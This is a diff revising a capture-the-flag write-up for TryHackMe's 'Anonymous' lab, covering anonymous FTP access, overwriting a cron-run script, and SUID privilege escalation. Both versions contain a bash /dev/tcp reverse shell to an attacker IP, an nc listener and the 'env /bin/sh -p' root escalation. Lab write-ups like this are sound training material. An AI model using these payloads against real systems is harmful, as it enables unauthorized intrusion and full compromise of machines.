@@ -1,132 +1,103 @@
 # Anonymous - TryHackMe
 
-Linux machine combining FTP anonymous access, a writable script executed by the system, and a SUID binary exploitable via GTFOBins. No credentials are needed at any stage - the entire chain runs on misconfigurations.
+Linux machine combining anonymous FTP access, a writable script executed by the system, and
+a SUID binary exploitable via GTFOBins. No credentials are needed at any stage - the whole
+chain runs on misconfigurations.
+
+Target: `10.63.142.87`
 
 ---
 
-## Objectives
-
-- Identify exposed services and misconfigurations
-- Achieve initial access using legitimate service functionality
-- Escalate privileges to root
-- Capture both user and root flags
-- Apply a **methodology-first approach**, avoiding unnecessary exploitation
-
----
-
-## Initial Enumeration
-
-### Network Scanning
+## Reconnaissance
 
 ```bash
 nmap -sC -sV -T4 10.63.142.87
 ```
-**Key findings**:
 
-- FTP (21) - **Anonymous login enabled**
-- SMB (139, 445) - Guest access available
-- SSH (22) - Present but not required
+- FTP (21) - anonymous login enabled
+- SMB (139, 445) - guest access available
+- SSH (22) - present, not needed
 
-Although SMB enumeration was possible, it did not immediately provide a viable attack path.
+SMB guest access doesn't lead anywhere (`enum4linux` shows nothing beyond the guest
+session), so FTP is the actual entry point.
 
-### SMB Enumeration (False Path)
-```bash
-enum4linux 10.63.142.87
-```
-- Guest access confirmed
-- Shared resources accessible
-- No sensitive credentials or execution vectors discovered
+---
 
-**Takeaway**:
-Not every exposed service is a viable entry point. Enumeration should inform decisions, not rush exploitation.
+## Enumeration
 
-## FTP Enumeration (Primary Attack Vector)
-Anonymous FTP Login
 ```bash
 ftp 10.63.142.87
 ```
-Anonymous access revealed a writable directory containing scripts:
 
-
-```bash
-/scripts
-```
-Files of interest:
+Anonymous login gives access to a writable `/scripts` directory:
 
 - `clean.sh`
 - `removed_files.log`
 - `to_do.txt`
 
-**Critical Finding**
-A **writable script** (`clean.sh`) **executed by the system** is a direct path to Remote Code Execution.
+`clean.sh` is writable - if something on the system runs it periodically, overwriting it
+means remote code execution.
 
-## Initial Access - Reverse Shell via Script Injection
-### Payload Preparation
-The existing `clean.sh` script was overwritten with a reverse shell payload:
+---
+
+## Initial Access - Script Injection
+
+Overwrite `clean.sh` with a reverse shell payload:
 
 ```bash
 #!/bin/bash
 bash -i >& /dev/tcp/10.63.108.42/4444 0>&1
 ```
-### Upload via FTP
+
+Upload it over FTP:
+
 ```
 put clean.sh
 ```
-### Listener on Attack Box
+
+Start a listener and wait for the next execution:
+
 ```bash
 nc -lvnp 4444
 ```
-Once the script executed, a shell was obtained successfully.
 
-## Capturing the User Flag
-With shell access established, the user flag was read from the home directory:
+Shell received. User flag is readable from the home directory.
 
-```bash
-cat user.txt
-```
+---
 
 ## Privilege Escalation
-### SUID Enumeration
+
 ```bash
 find / -user root -perm -u=s 2>/dev/null
 ```
-Interesting binary discovered:
 
-```bash
-/usr/bin/env
-```
-### Exploiting SUID env (GTFOBins)
-According to GTFOBins, `env` with the SUID bit can spawn a privileged shell:
+`/usr/bin/env` has the SUID bit set. Per GTFOBins, that's enough for a root shell:
 
 ```bash
 env /bin/sh -p
-```
-Verification:
-
-```bash
 whoami
 ```
-Output:
 
 ```
 root
 ```
-Privilege escalation successful.
 
-## Capturing the Root Flag
-```bash
-cd /root
-cat root.txt
-```
+Root flag is in `/root/`.
+
+---
 
 ## Key Takeaways
-- Anonymous FTP access combined with writable scripts is extremely dangerous
-- Enumeration should guide exploitation, not the other way around
-- SMB access can be a false positive path
-- SUID binaries must always be audited
-- GTFOBins is essential for real-world privilege escalation
-- Simple misconfigurations often lead to total compromise
+
+- Anonymous FTP with a writable directory is dangerous whenever something on the system
+  executes files from it - check for cron jobs or watchers before assuming it's just storage.
+- SMB guest access is worth a quick look but isn't automatically a way in - don't spend more
+  time on it than the first `enum4linux` pass.
+- SUID binaries should always be checked against GTFOBins before assuming they need custom
+  exploitation.
+
+---
 
 ## Disclaimer
-This lab was completed in a controlled and legal environment provided by TryHackMe.
-All actions were performed strictly for educational and training purposes.
+
+This lab was completed in a controlled environment provided by TryHackMe. All actions were
+performed strictly for educational purposes.
